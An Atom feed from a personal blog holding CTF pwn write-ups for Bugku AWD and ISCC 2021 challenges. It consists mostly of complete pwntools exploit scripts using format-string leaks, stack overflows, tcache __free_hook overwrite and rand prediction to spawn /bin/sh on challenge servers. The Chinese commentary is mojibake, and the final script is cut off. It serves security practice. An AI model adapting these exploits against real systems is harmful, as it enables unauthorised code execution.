<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  
  <link href="https://brooke-hub.github.io/atom.xml" rel="self"/>
  
  <link href="https://brooke-hub.github.io/"/>
  <updated>2021-06-05T08:56:40.797Z</updated>
  <id>https://brooke-hub.github.io/</id>
  
  <author>
    <name>WendyJellyBeans</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>S1èµ›å­£æ’ä½èµ›</title>
    <link href="https://brooke-hub.github.io/2021/06/05/S1%E8%B5%9B%E5%AD%A3%E6%8E%92%E4%BD%8D%E8%B5%9B/"/>
    <id>https://brooke-hub.github.io/2021/06/05/S1%E8%B5%9B%E5%AD%A3%E6%8E%92%E4%BD%8D%E8%B5%9B/</id>
    <published>2021-06-05T08:47:10.000Z</published>
    <updated>2021-06-05T08:56:40.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bugku-S1-AWDæ’ä½èµ›-16"><a href="#Bugku-S1-AWDæ’ä½èµ›-16" class="headerlink" title="Bugku S1 AWDæ’ä½èµ›-16"></a>Bugku S1 AWDæ’ä½èµ›-16</h2><p>å‘¨å…­å‚åŠ å®Œhackingclubï¼Œèµ¶ç€7ç‚¹å›æ¥è·Ÿç€å¤§å®¶ç¬¬ä¸€æ¬¡æ‰“AWDï¼Œæœç„¶è¢«æ‰“å¾—å¾ˆæƒ¨è€¶å“ˆå“ˆå“ˆï¼Œå¥½ä¸å®¹æ˜“è¿ä¸Šå»äº†ï¼Œpwnåªæœ‰ä¸€é“ï¼Œæ ˆæº¢å‡ºåŠ fmtï¼Œæˆ‘è¿™åˆšè°ƒå®Œåç§»ï¼ŒR1nd0å¸ˆå‚…å°±ä¿®å¥½äº†ï¼ˆæ€¥æ­»äººäº†</p><p>æœ€åä¹Ÿæ²¡æ‰“åˆ°åˆ«äººï¼Œç°åœ¨è¿˜ä¸çŸ¥é“è¯¥ç”¨ä»€ä¹ˆIPç«¯å£å»è¿ğŸ˜¢</p><p>æ„Ÿè§‰æ¯”CTFåˆºæ¿€å¤šäº†ï¼Œç‰¹åˆ«æ˜¯çœ‹ç€åˆ†ä¸€ç›´æ‰ï¼ˆXï¼Œå…¨ç¨‹80åˆ†é’Ÿä¸€ä¸‹å°±è¿‡å»äº†ï¼Œæœ€åæ’åå«åº•ï¼Œä½†æ˜¯è«åå¥½å¼€å¿ƒï¼ˆbushi</p><span id="more"></span><h3 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./helloworld&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;http://192-168-1-231.awd.bugku.cn/&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;./emarm&quot;])</span></span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;,&quot;-L&quot;,&quot;.&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./emarm&quot;])</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;%3$p.%43$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;.0x&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x6b41d</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">canary = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>),<span class="number">16</span>) </span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>, canary)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sla(<span class="string">&#x27;text:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xa2</span>-<span class="number">0xc</span>)+p32(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span>+p32(system)+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A044</span>))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h2 id="Bugku-S1-AWDæ’ä½èµ›-17"><a href="#Bugku-S1-AWDæ’ä½èµ›-17" class="headerlink" title="Bugku S1 AWDæ’ä½èµ›-17"></a>Bugku S1 AWDæ’ä½èµ›-17</h2><p>ä»ä¸Šæ¬¡çš„å€’æ•°ç¬¬ä¸€åˆ°è¿™æ¬¡çš„ä¸­æ¸¸åä¸Šï¼Œè¿™æ¬¡æ‰“åˆ°åˆ«äººè¾£å¥½è€¶ï¼Œç–¯ç‹‚äº¤flagï¼Œç»“æœå‘ç°åˆ†æ•°åŸºæœ¬æ²¡å˜åŒ–</p><p>åˆ«äººéƒ½æ˜¯è„šæœ¬è‡ªåŠ¨äº¤flagï¼Œæå‰ä¸‹ç­ï¼Œæœç„¶æ‰“awdç»éªŒå¥½é‡è¦</p><p>ï¼ˆæ¯æ¬¡pwné¢˜å°±è¿™ï¼Œå¥½æ•·è¡ï¼Œå‰åŠå°æ—¶å†™å®ŒexpåŸºæœ¬æ²¡äº‹äº†</p><h3 id="helloworld-1"><a href="#helloworld-1" class="headerlink" title="helloworld"></a>helloworld</h3><p>32ä½çš„ç¨‹åºè¿˜å¾—patchä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld-linux.so.2 --set-rpath . helloworld</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./helloworld&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;./emarm&quot;])</span></span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;,&quot;-L&quot;,&quot;.&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./emarm&quot;])</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;repeater?&#x27;</span>,<span class="string">&#x27;%35$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x19ad3</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># %10$p. % 20$p. % 30$p</span></span><br><span class="line">pay = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: system&#125;)</span><br><span class="line">sl(pay)</span><br><span class="line"><span class="comment"># 0x18647</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æŒç»­æ›´æ–°ã€‚ã€‚ã€‚åº”è¯¥å§</summary>
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iscc2021</title>
    <link href="https://brooke-hub.github.io/2021/05/26/iscc2021/"/>
    <id>https://brooke-hub.github.io/2021/05/26/iscc2021/</id>
    <published>2021-05-26T08:45:26.000Z</published>
    <updated>2021-06-05T09:01:13.593Z</updated>
    
    <content type="html"><![CDATA[<p>pycc</p><p>å¥½å¤šæ¯”èµ›ï¼ŒæŠ½ç©ºæ‰“æ‰“baby pwn</p><span id="more"></span><h2 id="box"><a href="#box" class="headerlink" title="box"></a>box</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(</span><br><span class="line">    <span class="string">&quot;/home/ive6ix/Desktop/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>, <span class="number">7020</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">&#x27;libc_base = &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">   sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">   cmd(<span class="number">1</span>)</span><br><span class="line">   sla(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index)) <span class="comment"># index:0-6</span></span><br><span class="line">   sla(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size)) <span class="comment"># &lt;0x400</span></span><br><span class="line">   sa(<span class="string">&#x27;data:&#x27;</span>, data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span> <span class="comment"># 5times</span></span><br><span class="line">   cmd(<span class="number">3</span>)</span><br><span class="line">   sla(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">   cmd(<span class="number">4</span>)</span><br><span class="line">   sla(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">   cmd(<span class="number">2</span>)</span><br><span class="line">   sla(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">   sa(<span class="string">&#x27;the data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leaklibc()</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(__free_hook)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(system)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><img src="/2021/05/26/iscc2021/1622859780459-e19942aa-2661-4b07-8a52-c64adb705a4d.png" alt="Snipaste_2021-05-21_22-28-28.png"></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>ä¼šè°ƒç”¨Cåº“çš„rand</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./game&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>, <span class="number">7040</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sa(<span class="string">&#x27;name is :&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc.srand(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># libc.rand() % 6+1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    libc.srand(libc.rand())</span><br><span class="line">    sla(<span class="string">&#x27;Number:&#x27;</span>, <span class="built_in">str</span>(libc.rand() % <span class="number">0x64</span> + <span class="number">1</span>))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><img src="/2021/05/26/iscc2021/1622859819160-1bb4877a-8cb1-445f-9c5f-778cac8a85da.png" alt="game.png"></p><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>æ•´æ•°æº¢å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">&#x27;./M78&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>, <span class="number">7010</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line">    </span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;choice?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;building&#x27;</span>,<span class="string">&#x27;wendy&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x08049202</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x107</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">pay = pay + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment"># sa(&#x27;password&#x27;,&#x27;a&#x27;*0x107+&#x27;\x00&#x27;)</span></span><br><span class="line">sa(<span class="string">&#x27;password&#x27;</span>, pay)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><img src="/2021/05/26/iscc2021/1622859850369-31e21d53-67c1-4641-a624-bddb15005e81.png" alt="M78.png"></p><blockquote><p>ä¸‹é¢å°±æ˜¯æ²¡æ‰“å‡ºæ¥çš„é¢˜ç›®</p></blockquote><h2 id="full"><a href="#full" class="headerlink" title="full"></a>full</h2><p><img src="/2021/05/26/iscc2021/1622860031677-da8db5e2-86c2-45a2-99ec-cc8b8b71c88e.png" alt="image.png"></p><p><img src="/2021/05/26/iscc2021/1622860156416-3abcc12b-969d-40ce-a808-4fe3830b9eed.png" alt="image.png"></p><p>bufåœ¨bssæ®µï¼Œå†™scå¹¶ä¸”æº¢å‡ºdestè·³è½¬åˆ°sc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">&#x27;./full&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = 